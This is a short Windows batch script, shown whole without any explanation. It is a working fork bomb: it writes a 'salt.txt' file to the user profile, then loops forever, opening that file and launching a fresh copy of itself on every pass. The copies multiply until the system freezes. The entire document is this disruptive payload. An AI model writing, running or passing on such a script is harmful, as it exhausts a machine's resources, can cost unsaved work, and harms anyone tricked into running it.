@echo off

set "desktop=%USERPROFILE%\Desktop"
echo salt > "%USERPROFILE%\salt.txt"

:loop
start "" "%USERPROFILE%\salt.txt"
start "" "%~f0"
goto loop